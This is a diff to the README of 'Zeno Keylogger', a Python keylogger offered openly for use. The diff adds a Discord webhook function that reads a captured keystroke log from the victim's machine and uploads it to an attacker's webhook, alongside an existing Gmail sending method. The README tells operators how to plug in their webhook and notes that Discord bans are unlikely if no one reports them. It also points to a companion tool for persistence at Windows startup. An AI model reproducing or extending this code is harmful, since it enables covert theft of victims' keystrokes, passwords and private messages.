@@ -1,7 +1,7 @@
 ![alt text](https://github.com/Zurek0x/zeno_Hijacker/blob/main/media/Screenshot_1.png?raw=true)
 # Zeno Keylogger / Written in Python (EMAIL SERVICE)
 This is a keylogger written in Python that includes certain sending methods of logs
-specifically Email Servicing.
+specifically Email Servicing and Discord Webhooking.
 This is a better way to recieve logs since it doesn't require much effort or leaking
 of server configurations or server handling which can be confusing for people and could
 lead to more leaks.
@@ -40,6 +40,7 @@ class Mail:
         service.quit()
 
 class Send:
+    # Gmail #
     def Gmail(email, subject, data):
         mails=str(email).split()
         subject=subject
@@ -48,12 +49,34 @@ class Send:
         mail = Mail()
         mail.send(mails, subject, content)
         print("Sent")
+    # Discord Webhook #
+    def Webhook(subject, install_path, filename):
+        webhook_url=str("discord webhook")
+        constructed_data=str(f"""
+```
+{subject}
+```
+        """)
+        webhook = DiscordWebhook(url=str(webhook_url),
+        content=str(constructed_data),
+        rate_limit_retry=True,
+        username=f"Webhook With Files"
+        )
+        with open(f"{install_path}\\{filename}", "r") as f:
+            webhook.add_file(file=f.read(), filename=f"log.txt")
+        response = webhook.execute()
 ```
 
 # !NOTICE FOR GMAIL OR GOOGLE USERS!
 **For gmail users who are sending the Emails using Google Email Services like Gmail must setup a Less Secure App.**
 **To set this up review the video here -> https://youtu.be/pAPWBHxnFHM <- Once you do this replace the 2 Lines below.**
 ![alt text](https://github.com/Zurek0x/zeno_keylogger/blob/main/media/mok.png?raw=true)
+# !NOTICE FOR DISCORD/WEBHOOK USERS!
+**To setup your discord webhook go inside the file "exec_send.py" and find the line called "webhook_url=str("Your Webhook")" and replace it with your discord webhook that you are going to use to recieve messages.**
+**Most people should be able to do this, No guide is needed.**
+# !NOTICE FOR BOTH! #
+**It should be advised that the discord webhook is way faster and more reliable then Email Service but do keep in note it is against discords Terms Of Service and Conduct which could lead to your account getting banned.**
+**Of course this is very rare and usually doesn't happen as long as nobody reports your account or webhook, But do keep in note of that.**
 
 # Starting up with windows and extra stuff
 To use these features you must import the code into zeno_Embedder which is a tool to do exactly this -> https://github.com/Zurek0x/zeno_Embedder
